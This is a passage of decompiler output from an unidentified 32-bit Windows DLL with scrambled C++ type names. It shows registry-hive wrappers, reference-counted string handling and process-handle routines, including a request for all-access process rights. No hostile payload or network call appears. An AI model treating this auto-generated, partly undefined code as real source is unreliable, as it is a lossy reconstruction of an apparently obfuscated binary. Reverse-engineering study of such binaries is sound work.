  LOBYTE(v10) = 1;
  sub_1002E9DA(v5, v6);
  LOBYTE(v10) = 2;
  if ( sub_1000A1C0((int)&unk_100955A8, (int)v6) )
  {
    if ( sub_1000A1C0((int)&unk_10095598, (int)v6) )
    {
      if ( sub_1000A1C0((int)&unk_100955A0, (int)v6) )
      {
        if ( sub_1000A1C0((int)&unk_10095580, (int)v6) )
        {
          if ( sub_1000A1C0((int)&unk_10095590, (int)v6) )
          {
            if ( sub_1000A1C0((int)&unk_10095588, (int)v6) )
            {
              sub_1002E59F(&phkResult);
              _CxxThrowException(&phkResult, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
            }
            phkResult = 0;
            v3 = RegOpenCurrentUser(0xF003Fu, &phkResult);
            SetLastError(v3);
            if ( v3 )
            {
              if ( v3 != 2 )
              {
                if ( v3 != 5 )
                {
                  sub_1002E45A(pExceptionObject);
                  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
                }
                sub_1002E641(&v8);
                _CxxThrowException(&v8, (_ThrowInfo *)&_TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__);
              }
              sub_1002E59F(&v7);
              _CxxThrowException(&v7, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
            }
            v1 = (unsigned int)phkResult;
          }
          else
          {
            v1 = -2147483643;
          }
        }
        else
        {
          v1 = -2147483645;
        }
      }
      else
      {
        v1 = 0x80000000;
      }
    }
    else
    {
      v1 = -2147483647;
    }
  }
  else
  {
    v1 = -2147483646;
  }
  LOBYTE(v10) = 1;
  sub_10009F65(v6);
  LOBYTE(v10) = 0;
  sub_1002E984(v5);
  v10 = -1;
  sub_1002E779(v4);
  return v1;
}
// 10076520: using guessed type __TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__;
// 1001D995: using guessed type int var_94[21];
// 1001D995: using guessed type int var_40[7];
// 1001D995: using guessed type _DWORD pExceptionObject[4];

//----- (1001DB15) --------------------------------------------------------
_DWORD *__stdcall sub_1001DB15(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  _DWORD *i; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  int v7[20]; // [esp+10h] [ebp-A8h] BYREF
  int v8[7]; // [esp+60h] [ebp-58h] BYREF
  int v9[2]; // [esp+7Ch] [ebp-3Ch] BYREF
  int v10[7]; // [esp+84h] [ebp-34h] BYREF
  int v11[2]; // [esp+A0h] [ebp-18h] BYREF
  int v12; // [esp+A8h] [ebp-10h]
  int v13; // [esp+B4h] [ebp-4h]
  bool v14; // [esp+C7h] [ebp+Fh]

  v12 = 0;
  sub_1002E692(v7, a2);
  v13 = 1;
  sub_1002E818(v7, v10);
  LOBYTE(v13) = 2;
  sub_1002E9B9(v10);
  v2 = sub_1002E84B(v7, v8);
  LOBYTE(v13) = 3;
  v14 = sub_1002EACF((int)v10, (int)v2);
  LOBYTE(v13) = 2;
  sub_1002E984(v8);
  if ( v14 )
  {
    sub_10009D2C(a1, &word_1008EE38);
    v12 = 1;
  }
  else
  {
    sub_1002E9DA(v10, v11);
    LOBYTE(v13) = 4;
    sub_1002E9B9(v10);
    for ( i = sub_1002E84B(v7, v8); ; i = sub_1002E84B(v7, v8) )
    {
      LOBYTE(v13) = 5;
      v5 = !sub_1002EACF((int)v10, (int)i);
      LOBYTE(v13) = 4;
      sub_1002E984(v8);
      if ( !v5 )
        break;
      sub_1000A0C4((int)v11, (int)&unk_100955B0);
      v4 = sub_1002E9DA(v10, v9);
      LOBYTE(v13) = 6;
      sub_1000A0C4((int)v11, (int)v4);
      LOBYTE(v13) = 4;
      sub_10009F65(v9);
      sub_1002E9B9(v10);
    }
    sub_10009F32(a1, (int)v11);
    v12 = 1;
    LOBYTE(v13) = 2;
    sub_10009F65(v11);
  }
  LOBYTE(v13) = 1;
  sub_1002E984(v10);
  LOBYTE(v13) = 0;
  sub_1002E779(v7);
  return a1;
}
// 1001DB15: using guessed type int var_A8[20];
// 1001DB15: using guessed type int var_34[7];
// 1001DB15: using guessed type int var_58[7];

//----- (1001DC81) --------------------------------------------------------
char __thiscall sub_1001DC81(_DWORD *this)
{
  *this = off_10074268;
  return sub_1001DCD1((int)this);
}
// 10074268: using guessed type int (__thiscall *off_10074268[5])(void *Block, char);

//----- (1001DCB2) --------------------------------------------------------
_DWORD *__thiscall sub_1001DCB2(_DWORD *Block, char a2)
{
  sub_1001DC81(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001DCD1) --------------------------------------------------------
char __usercall sub_1001DCD1@<al>(int a1@<esi>)
{
  void *v1; // ecx
  char result; // al

  if ( !sub_1001DCEA(a1) )
    return 1;
  result = sub_10025E46(v1, a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}
// 1001DCDD: variable 'v1' is possibly undefined

//----- (1001DCEA) --------------------------------------------------------
BOOL __usercall sub_1001DCEA@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (1001DCFD) --------------------------------------------------------
_DWORD *__stdcall sub_1001DCFD(_DWORD *a1)
{
  sub_10009175(a1, 0);
  return a1;
}

//----- (1001DD21) --------------------------------------------------------
void __stdcall sub_1001DD21(void *a1)
{
  sub_100091B9(a1);
}

//----- (1001DD41) --------------------------------------------------------
_DWORD *__stdcall sub_1001DD41(_DWORD *a1, int pExceptionObject)
{
  sub_1001DF0D(a1, pExceptionObject);
  return a1;
}

//----- (1001DD72) --------------------------------------------------------
int __usercall sub_1001DD72@<eax>(_DWORD *a1@<edi>)
{
  int v1; // eax

  v1 = sub_1001DE2D(a1);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (1001DD82) --------------------------------------------------------
_DWORD *__userpurge sub_1001DD82@<eax>(_DWORD *a1@<edi>, _DWORD *a2, int a3)
{
  int v3; // eax

  v3 = sub_1001DE2D(a1);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 8))(v3, a3);
  sub_1001DD41(a2, a3);
  return a2;
}

//----- (1001DDC2) --------------------------------------------------------
void __stdcall sub_1001DDC2(int a1)
{
  int v1[5]; // [esp+10h] [ebp-18h] BYREF
  int v2; // [esp+24h] [ebp-4h]

  sub_1001DD41(v1, a1);
  v2 = 0;
  sub_1001E012(v1);
  v2 = -1;
  sub_1001DFCF(v1);
}
// 1001DDC2: using guessed type int var_18[5];

//----- (1001DDFF) --------------------------------------------------------
void __stdcall sub_1001DDFF(_DWORD *a1, int a2, int a3)
{
  sub_1001DE86(a1, &a2);
  sub_100091B9(&a2);
}

//----- (1001DE2D) --------------------------------------------------------
int __usercall sub_1001DE2D@<eax>(_DWORD *a1@<edi>)
{
  _DWORD *v1; // eax
  int v2; // ecx
  _DWORD *v3; // eax
  int v5; // [esp-8h] [ebp-28h] BYREF
  int v6; // [esp-4h] [ebp-24h]
  void *Block; // [esp+10h] [ebp-10h]
  int v8; // [esp+1Ch] [ebp-4h]

  if ( !*a1 )
  {
    v1 = operator new(8u);
    v2 = v6;
    Block = v1;
    v8 = 0;
    if ( v1 )
      v3 = sub_1001CC57(v1);
    else
      v3 = 0;
    v8 = -1;
    v6 = v2;
    v5 = v2;
    Block = &v5;
    sub_10009175(&v5, (int)v3);
    v8 = -1;
    sub_1001DDFF(a1, v5, v6);
  }
  return *a1;
}
// 1001DE60: variable 'v2' is possibly undefined

//----- (1001DE86) --------------------------------------------------------
_DWORD *__usercall sub_1001DE86@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10009204((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1001DEAB) --------------------------------------------------------
void __usercall sub_1001DEAB(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10009204((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (1001DF0D) --------------------------------------------------------
_DWORD *__stdcall sub_1001DF0D(_DWORD *a1, int pExceptionObject)
{
  int v2; // eax
  int v4; // [esp-4h] [ebp-20h]

  v4 = pExceptionObject;
  *a1 = off_1007426C;
  sub_10009F32(a1 + 1, v4);
  sub_1000922C();
  v2 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  if ( !(*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)v2 + 4))(v2, pExceptionObject) )
  {
    SetLastError(2u);
    sub_1002E59F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__);
  }
  return a1;
}
// 1007426C: using guessed type int (__thiscall *off_1007426C[4])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001DF7D) --------------------------------------------------------
int *__thiscall sub_1001DF7D(int *Block, char a2)
{
  sub_1001DFCF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001DF9C) --------------------------------------------------------
_DWORD *__stdcall sub_1001DF9C(_DWORD *a1, int a2)
{
  *a1 = off_1007426C;
  sub_10009F32(a1 + 1, a2 + 4);
  return a1;
}
// 1007426C: using guessed type int (__thiscall *off_1007426C[4])(void *Block, char);

//----- (1001DFCF) --------------------------------------------------------
void __thiscall sub_1001DFCF(int *this)
{
  *this = (int)off_1007426C;
  sub_10009F65(this + 1);
}
// 1007426C: using guessed type int (__thiscall *off_1007426C[4])(void *Block, char);

//----- (1001DFF6) --------------------------------------------------------
BOOL __usercall sub_1001DFF6@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1000A1C0(a1 + 4, a2 + 4) == 0;
}

//----- (1001E012) --------------------------------------------------------
int __thiscall sub_1001E012(void *this)
{
  _DWORD *v2; // edi
  _DWORD *i; // ecx
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  bool v8; // bl
  _DWORD *v9; // edi
  _DWORD *j; // ecx
  _DWORD *v11; // eax
  bool v12; // bl
  int v13; // eax
  int v15; // [esp+0h] [ebp-78h]
  int v16; // [esp+4h] [ebp-74h]
  int v17[5]; // [esp+10h] [ebp-68h] BYREF
  int v18[5]; // [esp+24h] [ebp-54h] BYREF
  int v19[5]; // [esp+38h] [ebp-40h] BYREF
  int v20[5]; // [esp+4Ch] [ebp-2Ch] BYREF
  int v21; // [esp+60h] [ebp-18h] BYREF
  int v22[4]; // [esp+64h] [ebp-14h] BYREF
  int v23; // [esp+74h] [ebp-4h]

  sub_1000922C();
  v2 = sub_1001EAF1((int)this, v19);
  v23 = 0;
  for ( i = sub_1001EAB6((int)this, v20); ; i = sub_1001EAB6((int)this, v20) )
  {
    LOBYTE(v23) = 1;
    v8 = !sub_1001E7A2((int)v2, (int)i);
    LOBYTE(v23) = 0;
    sub_1001E6BD(v20);
    v23 = -1;
    sub_1001E6BD(v19);
    if ( !v8 )
      break;
    v4 = sub_1001DE2D((_DWORD *)dword_10091D5C);
    v5 = sub_1001EAB6((int)this, v17);
    v23 = 2;
    v6 = sub_1001E75B(v5, v18);
    LOBYTE(v23) = 3;
    v7 = sub_1001C33C((int)v6, v22);
    LOBYTE(v23) = 4;
    (*(void (__thiscall **)(int, int, _DWORD *))(*(_DWORD *)v4 + 36))(v4, (int)this + 4, v7);
    LOBYTE(v23) = 3;
    sub_10009F65(v22);
    LOBYTE(v23) = 2;
    sub_1001C2B3(v18);
    v23 = -1;
    sub_1001E6BD(v17);
    v2 = sub_1001EAF1((int)this, v19);
    v23 = 0;
  }
  v9 = sub_1001EA64((int)this, v20);
  v23 = 5;
  for ( j = sub_1001EA29((int)this, v19); ; j = sub_1001EA29((int)this, v19) )
  {
    LOBYTE(v23) = 6;
    v12 = !sub_1001EA02((int)v9, (int)j);
    LOBYTE(v23) = 5;
    sub_1001E91D(v19);
    v23 = -1;
    sub_1001E91D(v20);
    if ( !v12 )
      break;
    v11 = sub_1001EA29((int)this, v17);
    v23 = 7;
    sub_1001E9BB(v11, &v21);
    LOBYTE(v23) = 9;
    sub_1001E91D(v17);
    sub_1001E012(v15, v16);
    v23 = -1;
    sub_1001DFCF(&v21);
    v9 = sub_1001EA64((int)this, v20);
    v23 = 5;
  }
  v13 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v13 + 12))(v13, (int)this + 4);
}
// 1001E14C: variable 'v15' is possibly undefined
// 1001E14C: variable 'v16' is possibly undefined
// 10091D5C: using guessed type int dword_10091D5C;
// 1001E012: using guessed type int var_40[5];
// 1001E012: using guessed type int var_2C[5];
// 1001E012: using guessed type int var_68[5];
// 1001E012: using guessed type int var_54[5];
// 1001E012: using guessed type int var_14[4];

//----- (1001E1CB) --------------------------------------------------------
_DWORD *__stdcall sub_1001E1CB(int a1, _DWORD *a2, int a3)
{
  int v3; // eax
  int pExceptionObject[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  sub_10009F32(pExceptionObject, a1 + 4);
  v7 = 1;
  sub_1000A0C4((int)pExceptionObject, (int)&unk_100955B0);
  sub_1000A0C4((int)pExceptionObject, a3);
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v3 + 8))(v3, pExceptionObject);
  sub_1001DF0D(a2, (int)pExceptionObject);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_10009F65(pExceptionObject);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001E244) --------------------------------------------------------
_DWORD *__stdcall sub_1001E244(int a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax
  int v5[2]; // [esp+10h] [ebp-20h] BYREF
  int pExceptionObject[2]; // [esp+18h] [ebp-18h] BYREF
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  sub_1001E4AC(a1, pExceptionObject);
  v8 = 1;
  v3 = sub_10009F32(v5, (int)&unk_100955B0);
  LOBYTE(v8) = 2;
  sub_1000A0C4((int)pExceptionObject, (int)v3);
  LOBYTE(v8) = 1;
  sub_10009F65(v5);
  sub_1000A0C4((int)pExceptionObject, a3);
  sub_1001DF0D(a2, (int)pExceptionObject);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_10009F65(pExceptionObject);
  return a2;
}

//----- (1001E2BE) --------------------------------------------------------
char __stdcall sub_1001E2BE(int a1, int a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  char v4; // bl
  int v6[4]; // [esp+10h] [ebp-14h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  sub_1000922C();
  v2 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v3 = sub_1001E4AC(a1, v6);
  v7 = 0;
  v4 = (*(int (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v2 + 24))(v2, v3, a2);
  v7 = -1;
  sub_10009F65(v6);
  return v4;
}
// 10091D5C: using guessed type int dword_10091D5C;
// 1001E2BE: using guessed type int var_14[4];

//----- (1001E30F) --------------------------------------------------------
_DWORD *__stdcall sub_1001E30F(int pExceptionObject, _DWORD *a2, int a3)
{
  sub_1001C10B(a2, pExceptionObject, a3);
  return a2;
}

//----- (1001E343) --------------------------------------------------------
_DWORD *__stdcall sub_1001E343(int a1, _DWORD *a2, int pExceptionObject, int a4)
{
  int v4; // edi
  _DWORD *v5; // eax
  char v6; // bl
  int *v7; // eax
  int v8; // edi
  _DWORD *v9; // eax
  int v11[5]; // [esp+10h] [ebp-44h] BYREF
  int v12[5]; // [esp+24h] [ebp-30h] BYREF
  int v13[2]; // [esp+38h] [ebp-1Ch] BYREF
  int v14; // [esp+40h] [ebp-14h]
  char v15[12]; // [esp+44h] [ebp-10h] BYREF
  int v16; // [esp+50h] [ebp-4h]

  v14 = 0;
  sub_1000922C();
  v4 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v5 = sub_1001E4AC(a1, v13);
  v16 = 1;
  v6 = (*(int (__thiscall **)(int, _DWORD *, int))(*(_DWORD *)v4 + 24))(v4, v5, pExceptionObject);
  LOBYTE(v16) = 0;
  sub_10009F65(v13);
  if ( v6 )
  {
    sub_1002E54E(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVXsbqaAtiqgxcIvskflXaxsbqaat_qsbdzsml_sr__);
  }
  v15[0] = 0;
  v15[1] = 0;
  sub_1000C28D((void *)2, (int)v12, v15);
  v16 = 2;
  if ( a4 != 1 )
  {
    v7 = (int *)sub_1000C709(1, v12, (int)v11, 0);
    LOBYTE(v16) = 3;
    sub_1000C439(v7, (int)v12);
    LOBYTE(v16) = 2;
    sub_1000C45D(v11);
  }
  v8 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v9 = sub_1001E4AC(a1, v13);
  LOBYTE(v16) = 4;
  (*(void (__thiscall **)(int, _DWORD *, int, int *, int))(*(_DWORD *)v8 + 32))(v8, v9, pExceptionObject, v12, a4);
  LOBYTE(v16) = 2;
  sub_10009F65(v13);
  sub_1001C10B(a2, a1, pExceptionObject);
  v14 = 1;
  LOBYTE(v16) = 0;
  sub_1000C45D(v12);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;
// 1001E343: using guessed type int var_30[5];
// 1001E343: using guessed type int var_44[5];

//----- (1001E4AC) --------------------------------------------------------
_DWORD *__stdcall sub_1001E4AC(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 4);
  return a2;
}

//----- (1001E4E1) --------------------------------------------------------
_DWORD *__thiscall sub_1001E4E1(_DWORD *this, _DWORD *a2)
{
  const wchar_t *v3; // esi
  const wchar_t *v4; // ebx
  size_t v6; // eax
  wchar_t *String1; // [esp+14h] [ebp-14h]
  size_t MaxCount; // [esp+18h] [ebp-10h]

  v3 = *(const wchar_t **)(this[2] + 12);
  String1 = *(wchar_t **)(dword_100955B4 + 12);
  MaxCount = wcslen(String1);
  v4 = &v3[*(_DWORD *)(this[2] + 28) - MaxCount + 1];
  do
  {
    if ( v4 == v3 )
    {
      sub_10009F32(a2, (int)(this + 1));
      return a2;
    }
    --v4;
  }
  while ( wcsncmp(String1, v4, MaxCount) );
  v6 = wcslen(String1);
  sub_10009D2C(a2, (wchar_t *)&v4[v6]);
  return a2;
}
// 100955B4: using guessed type int dword_100955B4;

//----- (1001E56F) --------------------------------------------------------
_DWORD *__stdcall sub_1001E56F(_DWORD *a1, void *Block, int a3)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  *a1 = off_10074270;
  sub_10009F32(a1 + 1, (int)Block);
  a1[4] = a3;
  sub_1000922C();
  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001DD41(v3, (int)(a1 + 1));
  else
    v4 = 0;
  a1[3] = v4;
  return a1;
}
// 10074270: using guessed type int (__thiscall *off_10074270[3])(void *Block, char);

//----- (1001E5D2) --------------------------------------------------------
int *__thiscall sub_1001E5D2(int *Block, char a2)
{
  sub_1001E6BD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001E5F1) --------------------------------------------------------
_DWORD *__userpurge sub_1001E5F1@<eax>(int a1@<edi>, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax

  *a2 = off_10074270;
  sub_10009F32(a2 + 1, a1 + 4);
  v2 = operator new(0xCu);
  if ( v2 )
    v3 = sub_1001DF9C(v2, *(_DWORD *)(a1 + 12));
  else
    v3 = 0;
  a2[3] = v3;
  a2[4] = *(_DWORD *)(a1 + 16);
  return a2;
}
// 10074270: using guessed type int (__thiscall *off_10074270[3])(void *Block, char);

//----- (1001E652) --------------------------------------------------------
int *__userpurge sub_1001E652@<eax>(int *a1@<esi>, int *Block)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  if ( a1 != Block )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))a1[3];
    if ( v2 )
      (**v2)(v2, 1);
    sub_100021B1(Block + 2, a1 + 2);
    a1[4] = Block[4];
    sub_1000922C();
    v3 = operator new(0xCu);
    if ( v3 )
      v4 = sub_1001DD41(v3, (int)(a1 + 1));
    else
      v4 = 0;
    a1[3] = (int)v4;
  }
  return a1;
}

//----- (1001E6BD) --------------------------------------------------------
void __thiscall sub_1001E6BD(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = (int)off_10074270;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
    (**v2)(v2, 1);
  sub_10009F65(this + 1);
}
// 10074270: using guessed type int (__thiscall *off_10074270[3])(void *Block, char);

//----- (1001E712) --------------------------------------------------------
void *__thiscall sub_1001E712(_DWORD *this, void *a2)
{
  int v3; // eax

  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, void *, _DWORD *, _DWORD))(*(_DWORD *)v3 + 40))(v3, a2, this + 1, this[4]);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001E75B) --------------------------------------------------------
_DWORD *__userpurge sub_1001E75B@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  void *v2; // eax
  int v4[2]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+18h] [ebp-10h]
  int v6; // [esp+24h] [ebp-4h]

  v5 = 0;
  v2 = sub_1001E712(a1, v4);
  v6 = 1;
  sub_1001E30F(a1[3], a2, (int)v2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_10009F65(v4);
  return a2;
}

//----- (1001E7A2) --------------------------------------------------------
bool __usercall sub_1001E7A2@<al>(int a1@<eax>, int a2@<ecx>)
{
  return *(_DWORD *)(a1 + 16) == *(_DWORD *)(a2 + 16) && sub_1001DFF6(*(_DWORD *)(a1 + 12), *(_DWORD *)(a2 + 12));
}

//----- (1001E7CA) --------------------------------------------------------
_DWORD *__stdcall sub_1001E7CA(_DWORD *a1, int a2, void *Block)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  *a1 = off_10074274;
  sub_10009F32(a1 + 1, a2);
  a1[4] = Block;
  sub_1000922C();
  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001DD41(v3, a2);
  else
    v4 = 0;
  a1[3] = v4;
  return a1;
}
// 10074274: using guessed type int (__thiscall *off_10074274[2])(void *Block, char);

//----- (1001E82F) --------------------------------------------------------
int *__thiscall sub_1001E82F(int *Block, char a2)
{
  sub_1001E91D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001E84E) --------------------------------------------------------
_DWORD *__userpurge sub_1001E84E@<eax>(int a1@<edi>, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax

  *a2 = off_10074274;
  sub_10009F32(a2 + 1, a1 + 4);
  a2[4] = *(_DWORD *)(a1 + 16);
  sub_1000922C();
  v2 = operator new(0xCu);
  if ( v2 )
    v3 = sub_1001DD41(v2, (int)(a2 + 1));
  else
    v3 = 0;
  a2[3] = v3;
  return a2;
}
// 10074274: using guessed type int (__thiscall *off_10074274[2])(void *Block, char);

//----- (1001E8B2) --------------------------------------------------------
int *__userpurge sub_1001E8B2@<eax>(int *a1@<esi>, int *Block)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  if ( a1 != Block )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))a1[3];
    if ( v2 )
      (**v2)(v2, 1);
    sub_100021B1(Block + 2, a1 + 2);
    a1[4] = Block[4];
    sub_1000922C();
    v3 = operator new(0xCu);
    if ( v3 )
      v4 = sub_1001DD41(v3, (int)(a1 + 1));
    else
      v4 = 0;
    a1[3] = (int)v4;
  }
  return a1;
}

//----- (1001E91D) --------------------------------------------------------
void __thiscall sub_1001E91D(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = (int)off_10074274;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
    (**v2)(v2, 1);
  sub_10009F65(this + 1);
}
// 10074274: using guessed type int (__thiscall *off_10074274[2])(void *Block, char);

//----- (1001E972) --------------------------------------------------------
void *__thiscall sub_1001E972(_DWORD *this, void *a2)
{
  int v3; // eax

  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, void *, _DWORD *, _DWORD))(*(_DWORD *)v3 + 16))(v3, a2, this + 1, this[4]);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001E9BB) --------------------------------------------------------
_DWORD *__userpurge sub_1001E9BB@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  void *v2; // eax
  int v4[2]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+18h] [ebp-10h]
  int v6; // [esp+24h] [ebp-4h]

  v5 = 0;
  v2 = sub_1001E972(a1, v4);
  v6 = 1;
  sub_1001E244(a1[3], a2, (int)v2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_10009F65(v4);
  return a2;
}

//----- (1001EA02) --------------------------------------------------------
BOOL __usercall sub_1001EA02@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return *(_DWORD *)(a1 + 16) == *(_DWORD *)(a2 + 16) && !sub_1000A1C0(a1 + 4, a2 + 4);
}

//----- (1001EA29) --------------------------------------------------------
_DWORD *__stdcall sub_1001EA29(int a1, _DWORD *a2)
{
  sub_1001E7CA(a2, a1 + 4, 0);
  return a2;
}

//----- (1001EA64) --------------------------------------------------------
_DWORD *__stdcall sub_1001EA64(int a1, _DWORD *a2)
{
  int v2; // eax
  void *v3; // eax

  sub_1000922C();
  v2 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v3 = (void *)(*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 20))(v2, a1 + 4);
  sub_1001E7CA(a2, a1 + 4, v3);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001EAB6) --------------------------------------------------------
_DWORD *__stdcall sub_1001EAB6(int a1, _DWORD *a2)
{
  sub_1001E56F(a2, (void *)(a1 + 4), 0);
  return a2;
}

//----- (1001EAF1) --------------------------------------------------------
_DWORD *__stdcall sub_1001EAF1(int a1, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax

  sub_1000922C();
  v2 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v3 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 44))(v2, a1 + 4);
  sub_1001E56F(a2, (void *)(a1 + 4), v3);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;

//----- (1001EB43) --------------------------------------------------------
_DWORD *__stdcall sub_1001EB43(_DWORD *a1, void *a2, char a3)
{
  sub_1000F25E(a1, a2, a3);
  *a1 = &off_100736A0;
  return a1;
}
// 100736A0: using guessed type int (__thiscall *off_100736A0)(void *Block, char);

//----- (1001EB76) --------------------------------------------------------
_DWORD *__cdecl sub_1001EB76(_DWORD *a1)
{
  HANDLE CurrentProcess; // eax

  CurrentProcess = GetCurrentProcess();
  sub_1001EB43(a1, CurrentProcess, 1);
  return a1;
}

//----- (1001EBAB) --------------------------------------------------------
int __thiscall sub_1001EBAB(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_10013422(this);
  sub_1002ED52(a2, v2);
  return a2;
}

//----- (1001EBE1) --------------------------------------------------------
_DWORD *__cdecl sub_1001EBE1(_DWORD *a1, int a2)
{
  sub_1001EE3A(a1, a2, 1, 0, 0x1F0FFFu);
  return a1;
}

//----- (1001EC1F) --------------------------------------------------------
_DWORD *__cdecl sub_1001EC1F(_DWORD *a1, int a2, DWORD a3)
{
  sub_1001EE3A(a1, a2, 0, 0, a3);
  return a1;
}

//----- (1001EC83) --------------------------------------------------------
int __cdecl sub_1001EC83(int a1, int a2, char a3)
{
  int v3; // ecx
  int v4; // esi
  _DWORD *v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  bool v8; // bl
  int v9; // ecx
  DWORD v10; // esi
  DWORD v11; // eax
  int v13; // [esp+14h] [ebp-48h]
  int v14; // [esp+18h] [ebp-44h]
  DWORD pSessionId; // [esp+1Ch] [ebp-40h] BYREF
  int v16[2]; // [esp+20h] [ebp-3Ch] BYREF
  int v17[2]; // [esp+28h] [ebp-34h] BYREF
  int v18[3]; // [esp+30h] [ebp-2Ch] BYREF
  _DWORD v19[5]; // [esp+3Ch] [ebp-20h] BYREF
  int v20; // [esp+58h] [ebp-4h]

  v4 = v3;
  v13 = -1;
  v14 = -1;
  sub_1000BA21(v17, a1);
  v20 = 0;
  if ( a2 != 2 )
  {
    if ( v4 == -1 )
    {
      v5 = sub_1001EB76(v18);
      LOBYTE(v20) = 1;
      v14 = (*(int (__thiscall **)(_DWORD *))(*v5 + 36))(v5);
      LOBYTE(v20) = 0;
      sub_10009696(v18);
    }
    else
    {
      v14 = v4;
    }
  }
  sub_100281D7(v19);
  LOBYTE(v20) = 2;
  sub_10020A55(v19, (int)v16);
  LOBYTE(v20) = 3;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v16[0] + 4))(v16[0]) )
  {
